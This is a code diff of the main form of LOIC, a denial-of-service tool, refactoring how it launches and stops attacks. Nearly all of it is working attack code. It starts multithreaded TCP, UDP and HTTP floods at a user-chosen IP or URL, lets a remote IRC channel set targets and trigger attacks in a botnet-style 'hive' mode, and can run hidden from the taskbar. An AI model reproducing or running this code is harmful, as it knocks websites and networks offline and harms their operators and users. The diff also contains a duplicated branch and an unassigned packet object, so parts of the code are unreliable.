@@ -4,6 +4,7 @@
  */
 
 using Meebey.SmartIrc4net;
+using PacketDotNet;
 using PcapDotNet.Core;
 using System;
 using System.Collections.Generic;
@@ -13,6 +14,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
+using Packet = PcapDotNet.Packets.Packet;
 
 namespace LOIC
 {
@@ -25,6 +27,7 @@ namespace LOIC
 		private static string channel;
 		private static bool ircenabled = false;
 		private static Dictionary<string, string> OpList;
+		private Flags flags = new Flags();
 
 		private void enableHive_CheckedChanged(object sender, EventArgs e)
 		{
@@ -102,7 +105,7 @@ namespace LOIC
 						irc.Connect(txtIRCserver.Text, port);
 						channel = txtIRCchannel.Text.ToLower();
 
-						irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
+						irc.Login("LOIC_" + Utils.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
 
 						// Spawn a thread to handle the listen.
 						irclisten = new Thread(new ThreadStart(IrcListenThread));
@@ -146,7 +149,7 @@ namespace LOIC
 					int port;
 					if (!int.TryParse(txtIRCport.Text, out port)) port = 6667;
 					irc.Connect(txtIRCserver.Text, port);
-					irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
+					irc.Login("LOIC_" + Utils.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
 				}
 				catch
 				{
@@ -304,253 +307,10 @@ namespace LOIC
 			}
 		}
 
-		#endregion IRC
-
-		public frmMain(bool hive, bool hide, string ircserver, string ircport, string ircchannel)
-		{
-			InitializeComponent();
-
-			// IRC
-			if (!ircserver.Equals(""))
-				txtIRCserver.Text = ircserver;
-			if (!ircport.Equals(""))
-				txtIRCport.Text = ircport;
-			if (!ircchannel.Equals(""))
-				txtIRCchannel.Text = ircchannel;
-
-			if (hide)
-			{
-				this.WindowState = FormWindowState.Minimized;
-				this.ShowInTaskbar = false;
-			}
-
-			if (hive) enableHive.Checked = true;
-			if (!hive) disableHive.Checked = true;
-
-			CheckForIllegalCrossThreadCalls = false;
-			tbSourceIP.Text = Utils.LocalIPAddress();
-			IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
-			if (allDevices.Count == 0)
-			{
-				MessageBox.Show("Winpcap is missing or not installed. Please fix this!");
-				btnAttack.Enabled = false;
-
-			}
-			for (int i = 0; i != allDevices.Count(); ++i)
-			{
-				cbAdapter.Items.Add(allDevices[i].Description);
-			}
-		}
-
-		private static TCPFlooder[] tcpFlooder;
-		private static XXPFlooder[] udpFlooder;
-		private static HTTPFlooder[] httpFlooder;
-
-		private void Attack(bool toggle, bool on, bool silent)
-		{
-			if ((btnAttack.Text == "IMMA CHARGIN MAH LAZER" && toggle == true) || (toggle == false && on == true))
-			{
-				try
-				{
-					UpdateSettings();
-				}
-				catch (Exception ex)
-				{
-					if (silent) return;
-					new frmWtf().Show(); MessageBox.Show(ex.Message, "What the shit."); return;
-				}
-
-				btnAttack.Text = "Stop flooding";
-
-				if (Settings.AttackType == AttackTypes.TcpFlood )
-				{
-					tcpFlooder = new TCPFlooder[Settings.NumThreads];
-					for (int a = 0; a < tcpFlooder.Length; a++)
-					{
-						tcpFlooder[a] = new TCPFlooder(Settings.TargetIp, Settings.TargetPort, Settings.AttackType, Settings.Delay, chkWaitReply.Checked, Settings.Payload, chkAllowRandom.Checked);
-						tcpFlooder[a].Start();
-					}
-				}
-				else if (Settings.AttackType == AttackTypes.UdpFlood)
-				{
-					udpFlooder = new XXPFlooder[Settings.NumThreads];
-					for (int a = 0; a < udpFlooder.Length; a++)
-					{
-						udpFlooder[a] = new XXPFlooder(Settings.TargetIp, Settings.TargetPort, Settings.AttackType, Settings.Delay, chkWaitReply.Checked, Settings.Payload, chkAllowRandom.Checked);
-						udpFlooder[a].Start();
-					}
-					
-				}
-				else if (Settings.AttackType == AttackTypes.HttpFlood)
-				{
-					httpFlooder = new HTTPFlooder[Settings.NumThreads];
-					for (int a = 0; a < httpFlooder.Length; a++)
-					{
-						httpFlooder[a] = new HTTPFlooder(Settings.TargetHost, Settings.TargetIp, Settings.TargetPort, Settings.RelativePath, chkWaitReply.Checked, Settings.Delay, Settings.Timeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
-						httpFlooder[a].Start();
-					}
-				}
-				tShowStats.Start();
-			}
-			else if (toggle == true || on == false)
-			{
-				btnAttack.Text = "IMMA CHARGIN MAH LAZER";
-				if (tcpFlooder != null)
-				{
-					for (int a = 0; a < tcpFlooder.Length; a++)
-					{
-						tcpFlooder[a].IsFlooding = false;
-					}
-				} else if (tcpFlooder != null)
-				{
-					for (int a = 0; a < tcpFlooder.Length; a++)
-					{
-						tcpFlooder[a].IsFlooding = false;
-					}
-				}
-				if (httpFlooder != null)
-				{
-					for (int a = 0; a < httpFlooder.Length; a++)
-					{
-						httpFlooder[a].IsFlooding = false;
-					}
-				}
-				//tShowStats.Stop();
-			}
-		}
-
-		private void UpdateSettings()
-		{
-			// set interface
-			IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
-			if (cbAdapter == null) throw new Exception("No Adapter Selected!");
-			Settings.SelectedDevice = allDevices[cbAdapter.SelectedIndex];
-
-
-			// attack type
-			string method = cbMethod.Text;
-			if (String.Equals(method, "TCP"))
-			{
-				Settings.AttackType = AttackTypes.TcpFlood;
-				//Settings.Protocol = 1;
-			}
-			if (String.Equals(method, "UDP"))
-			{
-				Settings.AttackType = AttackTypes.UdpFlood;
-				//Settings.Protocol = 2;
-			}
-			if (String.Equals(method, "HTTP"))
-			{
-				Settings.AttackType = AttackTypes.HttpFlood;
-				//Settings.Protocol = 3;
-			}
-
-
-			// flags
-			Settings.SYN = cbSyn.Checked;
-			Settings.ACK = cbAck.Checked;
-			Settings.FIN = cbFin.Checked;
-			Settings.RST = cbRst.Checked;
-			Settings.URG = cbUrg.Checked;
-			Settings.PSH = cbPsh.Checked;
-			Settings.ENC = cbEnc.Checked;
-			Settings.CWR = cbCwr.Checked;
-			Settings.NONE = cbNone.Checked;
-			Settings.NS = cbNs.Checked;
-
-			// target
-			try
-			{
-				Settings.TargetPort = Convert.ToInt32(txtPort.Text);
-			}
-			catch
-			{
-				throw new Exception("I don't think ports are supposed to be written like THAT.");
-			}
-
-			try
-			{
-				Settings.NumThreads = Convert.ToInt32(txtThreads.Text);
-			}
-			catch
-			{
-				throw new Exception("What on earth made you put THAT in the threads field?");
-			}
-
-			try
-			{
-				Settings.TargetIp = txtTarget.Text;
-				if (String.IsNullOrEmpty(Settings.TargetIp) || String.Equals(Settings.TargetIp, "N O N E !"))
-					throw new Exception("Select a target.");
-			}
-			catch
-			{
-				throw new Exception("What on earth made you put THAT in the target field?");
-			}
-
-			if (String.IsNullOrEmpty(Settings.TargetHost)) Settings.TargetHost = Settings.TargetIp;
-			if (!Settings.TargetHost.Contains("://")) Settings.TargetHost = String.Concat("http://", Settings.TargetHost);
-			Settings.TargetHost = new Uri(Settings.TargetHost).Host;
-
-
-
-			Settings.Payload = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
-			if (String.IsNullOrEmpty(Settings.Payload) &&
-				(Settings.AttackType == AttackTypes.TcpFlood || Settings.AttackType == AttackTypes.UdpFlood))
-				throw new Exception("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O");
-
-			Settings.RelativePath = txtSubsite.Text;
-			if (!Settings.RelativePath.StartsWith("/") && (Settings.AttackType == AttackTypes.HttpFlood))
-				throw new Exception("You have to enter a subsite (for example \"/\")");
-
-			try
-			{
-				Settings.Timeout = Convert.ToInt32(txtTimeout.Text);
-			}
-			catch
-			{
-				throw new Exception("What's up with something like that in the timeout box? =S");
-			}
-
-		}
-
-		private void LockOnIP(bool silent)
-		{
-			if (txtTargetIP.Text.Length == 0)
-			{
-				if (silent) return;
-				new frmWtf().Show();
-				MessageBox.Show("I think you forgot the IP.", "What the shit.");
-				return;
-			}
-			txtTarget.Text = txtTargetIP.Text;
-			Settings.TargetHost = txtTargetIP.Text;
-		}
-
-		private void LockOnURL(bool silent)
-		{
-			Settings.TargetHost = txtTargetURL.Text.ToLower();
-			if (String.IsNullOrEmpty(Settings.TargetHost))
-			{
-				if (silent) return;
-				new frmWtf().Show();
-				MessageBox.Show("A URL is fine too...", "What the shit.");
-				return;
-			}
-			if (!Settings.TargetHost.StartsWith("http://") && !Settings.TargetHost.StartsWith("https://")) Settings.TargetHost = String.Concat("http://", Settings.TargetHost);
-			try { txtTarget.Text = Dns.GetHostEntry(new Uri(Settings.TargetHost).Host).AddressList[0].ToString(); }
-			catch
-			{
-				if (silent) return;
-				new frmWtf().Show();
-				MessageBox.Show("The URL you entered does not resolve to an IP!", "What the shit.");
-				return;
-			}
-		}
-
 		private void CheckParams(List<string> pars)
 		{
-			Attack(false, false, true);
+			_silent = true;
+			Attack(false, false);
 
 			foreach (string param in pars)
 			{
@@ -573,12 +333,12 @@ namespace LOIC
 					{
 						case "targetip":
 							txtTargetIP.Text = value;
-							LockOnIP(true);
+							LockOnIP();
 							break;
 
 						case "targethost":
 							txtTargetURL.Text = value;
-							LockOnURL(true);
+							LockOnURL();
 							break;
 
 						case "timeout":
@@ -657,7 +417,8 @@ namespace LOIC
 				{
 					if (sp[0].ToLower() == "start")
 					{
-						Attack(false, true, true);
+						_silent = true;
+						Attack(false, true);
 						return;
 					}
 					else if (sp[0].ToLower() == "default")
@@ -696,6 +457,247 @@ namespace LOIC
 			}
 		}
 
+		#endregion IRC
+
+		public frmMain(bool hive, bool hide, string ircserver, string ircport, string ircchannel)
+		{
+			InitializeComponent();
+
+			// IRC
+			if (!ircserver.Equals(""))
+				txtIRCserver.Text = ircserver;
+			if (!ircport.Equals(""))
+				txtIRCport.Text = ircport;
+			if (!ircchannel.Equals(""))
+				txtIRCchannel.Text = ircchannel;
+
+			if (hide)
+			{
+				this.WindowState = FormWindowState.Minimized;
+				this.ShowInTaskbar = false;
+				_silent = true;
+			}
+
+			if (hive) enableHive.Checked = true;
+			if (!hive) disableHive.Checked = true;
+
+			CheckForIllegalCrossThreadCalls = false;
+			tbSourceIP.Text = Utils.LocalIPAddress();
+			IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
+			if (allDevices.Count == 0)
+			{
+				MessageBox.Show("Winpcap is missing or not installed. Please fix this!");
+				btnAttack.Enabled = false;
+			}
+			for (int i = 0; i != allDevices.Count(); ++i)
+			{
+				cbAdapter.Items.Add(allDevices[i].Description);
+			}
+		}
+
+		private static TCPFlooder[] tcpFlooder;
+		private static XXPFlooder[] udpFlooder;
+		private static HTTPFlooder[] httpFlooder;
+		private static Packet Packet;
+		private bool _silent;
+
+		private void Attack(bool toggle, bool on)
+		{
+			if ((btnAttack.Text == "IMMA CHARGIN MAH LAZER" && toggle == true) || (toggle == false && on == true))
+			{
+				try
+				{
+					UpdateSettings();
+				}
+				catch (Exception ex)
+				{
+					if (_silent) return;
+					new frmWtf().Show(); MessageBox.Show(ex.Message, "What the shit."); return;
+				}
+
+				btnAttack.Text = "Stop flooding";
+
+				if (Settings.AttackType == AttackTypes.TcpFlood)
+				{
+					tcpFlooder = new TCPFlooder[Settings.NumThreads];
+					for (int a = 0; a < tcpFlooder.Length; a++)
+					{
+						tcpFlooder[a] = new TCPFlooder(Packet,Settings.SelectedDevice,Settings.Delay);
+						tcpFlooder[a].Start();
+					}
+				}
+				else if (Settings.AttackType == AttackTypes.UdpFlood)
+				{
+					udpFlooder = new XXPFlooder[Settings.NumThreads];
+					for (int a = 0; a < udpFlooder.Length; a++)
+					{
+						udpFlooder[a] = new XXPFlooder(Settings.TargetIp, Settings.TargetPort, Settings.AttackType, Settings.Delay, chkWaitReply.Checked, Settings.Payload, chkAllowRandom.Checked);
+						udpFlooder[a].Start();
+					}
+				}
+				else if (Settings.AttackType == AttackTypes.HttpFlood)
+				{
+					httpFlooder = new HTTPFlooder[Settings.NumThreads];
+					for (int a = 0; a < httpFlooder.Length; a++)
+					{
+						httpFlooder[a] = new HTTPFlooder(Settings.TargetHost, Settings.TargetIp, Settings.TargetPort, Settings.RelativePath, chkWaitReply.Checked, Settings.Delay, Settings.Timeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
+						httpFlooder[a].Start();
+					}
+				}
+				tShowStats.Start();
+			}
+			else
+			{
+				btnAttack.Text = "IMMA CHARGIN MAH LAZER";
+				if (tcpFlooder != null)
+				{
+					for (int a = 0; a < tcpFlooder.Length; a++)
+					{
+						tcpFlooder[a].IsFlooding = false;
+					}
+				}
+				else if (tcpFlooder != null)
+				{
+					for (int a = 0; a < tcpFlooder.Length; a++)
+					{
+						tcpFlooder[a].IsFlooding = false;
+					}
+				}
+				if (httpFlooder != null)
+				{
+					for (int a = 0; a < httpFlooder.Length; a++)
+					{
+						httpFlooder[a].IsFlooding = false;
+					}
+				}
+				//tShowStats.Stop();
+			}
+		}
+
+		private void UpdateSettings()
+		{
+			// set interface
+			IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
+			if (cbAdapter == null) throw new Exception("No Adapter Selected!");
+			Settings.SelectedDevice = allDevices[cbAdapter.SelectedIndex];
+
+			// attack type
+			string method = cbMethod.Text;
+			if (String.Equals(method, "TCP"))
+			{
+				Settings.AttackType = AttackTypes.TcpFlood;
+				//Settings.Protocol = 1;
+			}
+			if (String.Equals(method, "UDP"))
+			{
+				Settings.AttackType = AttackTypes.UdpFlood;
+				//Settings.Protocol = 2;
+			}
+			if (String.Equals(method, "HTTP"))
+			{
+				Settings.AttackType = AttackTypes.HttpFlood;
+				//Settings.Protocol = 3;
+			}
+
+			// flags
+			flags.SYN = cbSyn.Checked;
+			flags.ACK = cbAck.Checked;
+			flags.FIN = cbFin.Checked;
+			flags.RST = cbRst.Checked;
+			flags.URG = cbUrg.Checked;
+			flags.PSH = cbPsh.Checked;
+			flags.ENC = cbEnc.Checked;
+			flags.CWR = cbCwr.Checked;
+			flags.NONE = cbNone.Checked;
+			flags.NS = cbNs.Checked;
+
+			// target
+			try
+			{
+				Settings.TargetPort = Convert.ToInt32(txtPort.Text);
+			}
+			catch
+			{
+				throw new Exception("I don't think ports are supposed to be written like THAT.");
+			}
+
+			try
+			{
+				Settings.NumThreads = Convert.ToInt32(txtThreads.Text);
+			}
+			catch
+			{
+				throw new Exception("What on earth made you put THAT in the threads field?");
+			}
+
+			try
+			{
+				Settings.TargetIp = txtTarget.Text;
+				if (String.IsNullOrEmpty(Settings.TargetIp) || String.Equals(Settings.TargetIp, "N O N E !"))
+					throw new Exception("Select a target.");
+			}
+			catch
+			{
+				throw new Exception("What on earth made you put THAT in the target field?");
+			}
+
+			if (String.IsNullOrEmpty(Settings.TargetHost)) Settings.TargetHost = Settings.TargetIp;
+			if (!Settings.TargetHost.Contains("://")) Settings.TargetHost = String.Concat("http://", Settings.TargetHost);
+			Settings.TargetHost = new Uri(Settings.TargetHost).Host;
+
+			Settings.Payload = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
+			if (String.IsNullOrEmpty(Settings.Payload) &&
+				(Settings.AttackType == AttackTypes.TcpFlood || Settings.AttackType == AttackTypes.UdpFlood))
+				throw new Exception("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O");
+
+			Settings.RelativePath = txtSubsite.Text;
+			if (!Settings.RelativePath.StartsWith("/") && (Settings.AttackType == AttackTypes.HttpFlood))
+				throw new Exception("You have to enter a subsite (for example \"/\")");
+
+			try
+			{
+				Settings.Timeout = Convert.ToInt32(txtTimeout.Text);
+			}
+			catch
+			{
+				throw new Exception("What's up with something like that in the timeout box? =S");
+			}
+		}
+
+		private void LockOnIP()
+		{
+			if (txtTargetIP.Text.Length == 0)
+			{
+				if (_silent) return;
+				new frmWtf().Show();
+				MessageBox.Show("I think you forgot the IP.", "What the shit.");
+				return;
+			}
+			txtTarget.Text = txtTargetIP.Text;
+			Settings.TargetHost = txtTargetIP.Text;
+		}
+
+		private void LockOnURL()
+		{
+			Settings.TargetHost = txtTargetURL.Text.ToLower();
+			if (String.IsNullOrEmpty(Settings.TargetHost))
+			{
+				if (_silent) return;
+				new frmWtf().Show();
+				MessageBox.Show("A URL is fine too...", "What the shit.");
+				return;
+			}
+			if (!Settings.TargetHost.StartsWith("http://") && !Settings.TargetHost.StartsWith("https://")) Settings.TargetHost = String.Concat("http://", Settings.TargetHost);
+			try { txtTarget.Text = Dns.GetHostEntry(new Uri(Settings.TargetHost).Host).AddressList[0].ToString(); }
+			catch
+			{
+				if (_silent) return;
+				new frmWtf().Show();
+				MessageBox.Show("The URL you entered does not resolve to an IP!", "What the shit.");
+				return;
+			}
+		}
+
 		private void frmMain_Closing(object sender, FormClosingEventArgs e)
 		{
 			try
@@ -714,12 +716,12 @@ namespace LOIC
 
 		private void cmdTargetURL_Click(object sender, EventArgs e)
 		{
-			LockOnURL(false);
+			LockOnURL();
 		}
 
 		private void cmdTargetIP_Click(object sender, EventArgs e)
 		{
-			LockOnIP(false);
+			LockOnIP();
 		}
 
 		private void txtTarget_Enter(object sender, EventArgs e)
@@ -729,7 +731,7 @@ namespace LOIC
 
 		private void cmdAttack_Click(object sender, EventArgs e)
 		{
-			Attack(true, false, false);
+			Attack(true, false);
 		}
 
 		private void tShowStats_Tick(object sender, EventArgs e)
